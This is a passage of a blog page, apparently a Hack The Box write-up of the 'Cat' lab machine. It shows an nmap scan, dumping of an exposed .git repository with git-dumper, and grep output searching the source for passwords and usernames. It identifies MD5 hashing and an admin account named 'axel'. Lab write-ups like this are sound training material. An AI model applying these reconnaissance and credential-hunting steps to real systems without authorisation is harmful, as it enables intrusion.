@@ -1,0 +1,932 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Muyi">
+    
+    <!-- Completely eliminate flash of wrong theme -->
+    <script>
+        (function() {
+            const THEME_KEY = "REDEFINE-THEME-STATUS";
+            const DARK = "dark", LIGHT = "light";
+            
+            // Get preferred theme
+            function getTheme() {
+                try {
+                    const saved = localStorage.getItem(THEME_KEY);
+                    if (saved) {
+                        const { isDark } = JSON.parse(saved);
+                        return isDark ? DARK : LIGHT;
+                    }
+                } catch (e) {}
+                
+                return matchMedia("(prefers-color-scheme: dark)").matches ? DARK : LIGHT;
+            }
+            
+            // Apply theme to document
+            function applyTheme(theme) {
+                const isDark = theme === DARK;
+                const root = document.documentElement;
+                
+                // Set data attribute for CSS variables
+                root.setAttribute("data-theme", theme);
+                
+                // Set classes for compatibility
+                root.classList.add(theme);
+                root.classList.remove(isDark ? LIGHT : DARK);
+                root.style.colorScheme = theme;
+            }
+            
+            // Initial application
+            const theme = getTheme();
+            applyTheme(theme);
+            
+            // Listen for system preference changes
+            matchMedia("(prefers-color-scheme: dark)").addEventListener("change", ({ matches }) => {
+                // Only update if using system preference (no localStorage entry)
+                if (!localStorage.getItem(THEME_KEY)) {
+                    applyTheme(matches ? DARK : LIGHT);
+                }
+            });
+            
+            // Set body classes once DOM is ready
+            if (document.readyState !== "loading") {
+                document.body.classList.add(theme + "-mode");
+            } else {
+                document.addEventListener("DOMContentLoaded", () => {
+                    document.body.classList.add(theme + "-mode");
+                    document.body.classList.remove((theme === DARK ? LIGHT : DARK) + "-mode");
+                });
+            }
+        })();
+    </script>
+    
+    <!-- Critical CSS to prevent flash -->
+    <style>
+        :root[data-theme="dark"] {
+            --background-color: #202124;
+            --background-color-transparent: rgba(32, 33, 36, 0.6);
+            --second-background-color: #2d2e32;
+            --third-background-color: #34353a;
+            --third-background-color-transparent: rgba(32, 33, 36, 0.6);
+            --primary-color: #0066CC;
+            --first-text-color: #ffffff;
+            --second-text-color: #eeeeee;
+            --third-text-color: #bebec6;
+            --fourth-text-color: #999999;
+            --default-text-color: #bebec6;
+            --invert-text-color: #373D3F;
+            --border-color: rgba(255, 255, 255, 0.08);
+            --selection-color: #0066CC;
+            --shadow-color-1: rgba(255, 255, 255, 0.08);
+            --shadow-color-2: rgba(255, 255, 255, 0.05);
+        }
+        
+        :root[data-theme="light"] {
+            --background-color: #fff;
+            --background-color-transparent: rgba(255, 255, 255, 0.6);
+            --second-background-color: #f8f8f8;
+            --third-background-color: #f2f2f2;
+            --third-background-color-transparent: rgba(241, 241, 241, 0.6);
+            --primary-color: #0066CC;
+            --first-text-color: #16171a;
+            --second-text-color: #2f3037;
+            --third-text-color: #5e5e5e;
+            --fourth-text-color: #eeeeee;
+            --default-text-color: #373D3F;
+            --invert-text-color: #bebec6;
+            --border-color: rgba(0, 0, 0, 0.08);
+            --selection-color: #0066CC;
+            --shadow-color-1: rgba(0, 0, 0, 0.08);
+            --shadow-color-2: rgba(0, 0, 0, 0.05);
+        }
+        
+        body {
+            background-color: var(--background-color);
+            color: var(--default-text-color);
+        }
+        
+        /* Apply body classes as soon as DOM is ready */
+        :root[data-theme="dark"] body {
+            background-color: var(--background-color);
+            color: var(--default-text-color);
+        }
+    </style>
+    
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://example.com/2025/02/06/hackthebox/htb-cat/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+    
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/elmo-launch.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/elmo-launch.png">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/elmo-launch.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            HTB-Cat | Muyi&#39;s Blog
+        
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/css/build/tailwind.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="/fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+    
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"example.com","root":"/","language":"en","path":"search.xml"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":false,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":5,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"dark"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":false,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"open_graph":{"enable":false,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine Your Hexo Journey."},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":false,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Blog for storing the knowledges I need (;","subtitle":{"text":["sudo echo \"subtitle goes here\""],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"11.4.1"}},"version":"2.8.5","navbar":{"auto_hide":true,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":150,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2025/1/22 12:00:00"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+
+<body>
+	<div class="progress-bar-container">
+	
+
+	
+	<span class="pjax-progress-bar"></span>
+	<!--        <span class="swup-progress-icon">-->
+	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+	<!--        </span>-->
+	
+</div>
+
+<main class="page-container" id="swup">
+
+	
+
+	<div class="main-content-container flex flex-col justify-between min-h-dvh">
+		<div class="main-content-header">
+			<header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Muyi&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    HOME
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/archives"
+                                        >
+                                    <i class="fa-regular fa-archive fa-fw"></i>
+                                    ARCHIVES
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                        <li class="navbar-item search search-popup-trigger">
+                            <i class="fa-solid fa-magnifying-glass"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
+                    </div>
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                HOME
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/archives"
+                        >
+                            <span>
+                                ARCHIVES
+                            </span>
+                            
+                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+
+            
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">7</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">4</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">37</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+		</div>
+
+		<div class="main-content-body transition-fade-up">
+			
+
+			<div class="main-content">
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
+
+		<div class="article-title relative w-full">
+			
+			<div class="w-full flex items-center pt-6 justify-start">
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">HTB-Cat</h1>
+			</div>
+			
+		</div>
+
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+				<img src="/images/elmo.png">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">Muyi</span>
+					
+					<span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv4</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2025-02-06 02:07:50</span>
+        <span class="mobile">2025-02-06 02:07:50</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2025-08-17 13:09:55</span>
+            <span class="mobile">2025-08-17 13:09:55</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/Medium/">Medium</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/HTB/">HTB</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/Linux/">Linux</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+</div>
+
+				</div>
+			</div>
+		</div>
+		
+
+		
+
+
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<p>nmap</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-05 22:23 +08</span><br><span class="line">Nmap scan report for cat.htb (10.10.11.53)</span><br><span class="line">Host is up (0.032s latency).</span><br><span class="line">Not shown: 998 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   3072 96:2d:f5:c6:f6:9f:59:60:e5:65:85:ab:49:e4:76:14 (RSA)</span><br><span class="line">|   256 9e:c4:a4:40:e9:da:cc:62:d1:d6:5a:2f:9e:7b:d4:aa (ECDSA)</span><br><span class="line">|_  256 6e:22:2a:6a:6d:eb:de:19:b7:16:97:c2:7e:89:29:d5 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">|_http-title: Best Cat Competition</span><br><span class="line">| http-cookie-flags:</span><br><span class="line">|   /:</span><br><span class="line">|     PHPSESSID:</span><br><span class="line">|_      httponly flag not set</span><br><span class="line">| http-git:</span><br><span class="line">|   10.10.11.53:80/.git/</span><br><span class="line">|     Git repository found!</span><br><span class="line">|     Repository description: Unnamed repository; edit this file &#x27;description&#x27; to name the...</span><br><span class="line">|_    Last commit message: Cat v1</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 7.99 seconds</span><br></pre></td></tr></table></figure></div>
+
+<p>Port 80 is hosting a website named <code>Best Cat Competition</code> with <code>.git</code> available, which opens up possibility to use <code>git-dumper</code>.</p>
+<p>Visiting port 80<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/htb-cat/Pasted image 20250205222805.png"
+                      width="500"
+                ></p>
+<p>Available phps:</p>
+<ol>
+<li>vote.php [“visit the website returns: Voting is currently closed”]</li>
+<li>contest.php [“requires us to register”]</li>
+<li>winners.php [“displays cats that win the competition”]</li>
+<li>join.php [“requires us to register as well”]</li>
+</ol>
+<p>Registering an account, log into it and visit <code>contest.php</code> for more content<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/htb-cat/Pasted image 20250205223516.png"
+                      width="500"
+                ></p>
+<p>Contest.php<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/htb-cat/Pasted image 20250205223713.png"
+                      width="250"
+                ></p>
+<p>Using <code>git-dumper</code> and dumping all the git directories from the website.</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(.venv) muyi@mag3:~/Desktop/htb/machines/cat~10.10.11.53$ git-dumper http://cat.htb git</span><br><span class="line"></span><br><span class="line">(.venv) muyi@mag3:~/Desktop/htb/machines/cat~10.10.11.53/git$ <span class="built_in">ls</span></span><br><span class="line">accept_cat.php  contest.php     img          join.php      vote.php</span><br><span class="line">admin.php       css             img_winners  logout.php    winners</span><br><span class="line">config.php      delete_cat.php  index.php    view_cat.php  winners.php</span><br></pre></td></tr></table></figure></div>
+
+<p>From there, try to grep for <code>username &amp; password</code></p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">                                        ----- Password -----</span><br><span class="line">(.venv) muyi@mag3:~/Desktop/htb/machines/cat~10.10.11.53/git$ grep -ir <span class="string">&#x27;password&#x27;</span></span><br><span class="line">css/styles.css:    input[<span class="built_in">type</span>=<span class="string">&quot;password&quot;</span>],</span><br><span class="line">join.php:    <span class="variable">$password</span> = md5(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line">join.php:        <span class="variable">$stmt_insert</span> = <span class="variable">$pdo</span>-&gt;prepare(<span class="string">&quot;INSERT INTO users (username, email, password) VALUES (:username, :email, :password)&quot;</span>);</span><br><span class="line">join.php:        <span class="variable">$stmt_insert</span>-&gt;execute([<span class="string">&#x27;:username&#x27;</span> =&gt; <span class="variable">$username</span>, <span class="string">&#x27;:email&#x27;</span> =&gt; <span class="variable">$email</span>, <span class="string">&#x27;:password&#x27;</span> =&gt; <span class="variable">$password</span>]);</span><br><span class="line">join.php:    <span class="variable">$password</span> = md5(<span class="variable">$_GET</span>[<span class="string">&#x27;loginPassword&#x27;</span>]);</span><br><span class="line">join.php:    <span class="keyword">if</span> (<span class="variable">$user</span> &amp;&amp; <span class="variable">$password</span> === <span class="variable">$user</span>[<span class="string">&#x27;password&#x27;</span>]) &#123;</span><br><span class="line">join.php:        <span class="variable">$error_message</span> = <span class="string">&quot;Incorrect username or password.&quot;</span>;</span><br><span class="line">join.php:            &lt;label <span class="keyword">for</span>=<span class="string">&quot;password&quot;</span>&gt;Password:&lt;/label&gt;</span><br><span class="line">join.php:            &lt;input <span class="built_in">type</span>=<span class="string">&quot;password&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;password&quot;</span> name=<span class="string">&quot;password&quot;</span> required&gt;</span><br><span class="line">join.php:            &lt;label <span class="keyword">for</span>=<span class="string">&quot;loginPassword&quot;</span>&gt;Password:&lt;/label&gt;</span><br><span class="line">join.php:            &lt;input <span class="built_in">type</span>=<span class="string">&quot;password&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;loginPassword&quot;</span> name=<span class="string">&quot;loginPassword&quot;</span> required&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                                        ----- Username -----</span><br><span class="line">(.venv) muyi@mag3:~/Desktop/htb/machines/cat~10.10.11.53/git$ grep -ir <span class="string">&#x27;username&#x27;</span></span><br><span class="line">accept_cat.php:<span class="keyword">if</span> (isset(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] === <span class="string">&#x27;axel&#x27;</span>) &#123;</span><br><span class="line">index.php:        <span class="keyword">if</span> (isset(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>])) &#123;</span><br><span class="line">index.php:            <span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] === <span class="string">&#x27;axel&#x27;</span>) &#123;</span><br><span class="line">delete_cat.php:<span class="keyword">if</span> (isset(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] == <span class="string">&#x27;axel&#x27;</span>)&#123;</span><br><span class="line">admin.php:<span class="keyword">if</span> (!isset(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]) || <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] !== <span class="string">&#x27;axel&#x27;</span>) &#123;</span><br><span class="line">admin.php:        <span class="keyword">if</span> (isset(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>])) &#123;</span><br><span class="line">admin.php:            <span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] == <span class="string">&#x27;axel&#x27;</span>) &#123;</span><br><span class="line">winners.php:        <span class="keyword">if</span> (isset(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>])) &#123;</span><br><span class="line">winners.php:            <span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] == <span class="string">&#x27;axel&#x27;</span>) &#123;</span><br><span class="line">view_cat.php:<span class="keyword">if</span> (!isset(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]) || <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] !== <span class="string">&#x27;axel&#x27;</span>) &#123;</span><br><span class="line">view_cat.php:    <span class="variable">$query</span> = <span class="string">&quot;SELECT cats.*, users.username FROM cats JOIN users ON cats.owner_username = users.username WHERE cat_id = :cat_id&quot;</span>;</span><br><span class="line">view_cat.php:        <span class="keyword">if</span> (isset(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>])) &#123;</span><br><span class="line">view_cat.php:            <span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] == <span class="string">&#x27;axel&#x27;</span>) &#123;</span><br><span class="line">view_cat.php:        &lt;strong&gt;Owner:&lt;/strong&gt; &lt;?php <span class="built_in">echo</span> <span class="variable">$cat</span>[<span class="string">&#x27;username&#x27;</span>]; ?&gt;&lt;br&gt;</span><br><span class="line">join.php:    <span class="variable">$username</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">join.php:    <span class="variable">$stmt_check</span> = <span class="variable">$pdo</span>-&gt;prepare(<span class="string">&quot;SELECT * FROM users WHERE username = :username OR email = :email&quot;</span>);</span><br><span class="line">join.php:    <span class="variable">$stmt_check</span>-&gt;execute([<span class="string">&#x27;:username&#x27;</span> =&gt; <span class="variable">$username</span>, <span class="string">&#x27;:email&#x27;</span> =&gt; <span class="variable">$email</span>]);</span><br><span class="line">join.php:        <span class="variable">$error_message</span> = <span class="string">&quot;Error: Username or email already exists.&quot;</span>;</span><br><span class="line">join.php:        <span class="variable">$stmt_insert</span> = <span class="variable">$pdo</span>-&gt;prepare(<span class="string">&quot;INSERT INTO users (username, email, password) VALUES (:username, :email, :password)&quot;</span>);</span><br><span class="line">join.php:        <span class="variable">$stmt_insert</span>-&gt;execute([<span class="string">&#x27;:username&#x27;</span> =&gt; <span class="variable">$username</span>, <span class="string">&#x27;:email&#x27;</span> =&gt; <span class="variable">$email</span>, <span class="string">&#x27;:password&#x27;</span> =&gt; <span class="variable">$password</span>]);</span><br><span class="line">join.php:    <span class="variable">$username</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;loginUsername&#x27;</span>];</span><br><span class="line">join.php:    <span class="variable">$stmt</span> = <span class="variable">$pdo</span>-&gt;prepare(<span class="string">&quot;SELECT * FROM users WHERE username = :username&quot;</span>);</span><br><span class="line">join.php:    <span class="variable">$stmt</span>-&gt;execute([<span class="string">&#x27;:username&#x27;</span> =&gt; <span class="variable">$username</span>]);</span><br><span class="line">join.php:        <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$user</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">join.php:        <span class="variable">$error_message</span> = <span class="string">&quot;Incorrect username or password.&quot;</span>;</span><br><span class="line">join.php:            &lt;label <span class="keyword">for</span>=<span class="string">&quot;username&quot;</span>&gt;Username:&lt;/label&gt;</span><br><span class="line">join.php:            &lt;input <span class="built_in">type</span>=<span class="string">&quot;text&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;username&quot;</span> name=<span class="string">&quot;username&quot;</span> required&gt;</span><br><span class="line">join.php:            &lt;label <span class="keyword">for</span>=<span class="string">&quot;loginUsername&quot;</span>&gt;Username:&lt;/label&gt;</span><br><span class="line">join.php:            &lt;input <span class="built_in">type</span>=<span class="string">&quot;text&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;loginUsername&quot;</span> name=<span class="string">&quot;loginUsername&quot;</span> required&gt;</span><br><span class="line">contest.php:<span class="keyword">if</span> (!isset(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>])) &#123;</span><br><span class="line">contest.php:                <span class="variable">$stmt</span> = <span class="variable">$pdo</span>-&gt;prepare(<span class="string">&quot;INSERT INTO cats (cat_name, age, birthdate, weight, photo_path, owner_username) VALUES (:cat_name, :age, :birthdate, :weight, :photo_path, :owner_username)&quot;</span>);</span><br><span class="line">contest.php:                <span class="variable">$stmt</span>-&gt;bindParam(<span class="string">&#x27;:owner_username&#x27;</span>, <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>], PDO::PARAM_STR);</span><br><span class="line">contest.php:        <span class="keyword">if</span> (isset(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>])) &#123;</span><br><span class="line">contest.php:            <span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] == <span class="string">&#x27;axel&#x27;</span>) &#123;</span><br><span class="line">vote.php:        <span class="keyword">if</span> (isset(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>])) &#123;</span><br><span class="line">vote.php:            <span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] === <span class="string">&#x27;axel&#x27;</span>) &#123;</span><br></pre></td></tr></table></figure></div>
+<p>from the results, </p>
+<ol>
+<li><code>join.php</code> verifies password in md5 format, which is susceptible to be cracked.</li>
+<li>username <code>axel</code> can be confirmed to be an administrator account since <code>admin.php</code> checks for username <code>axel</code></li>
+</ol>
+<p>Furthermore, from <code>git log</code>, the email of <code>axel</code> is exposed</p>
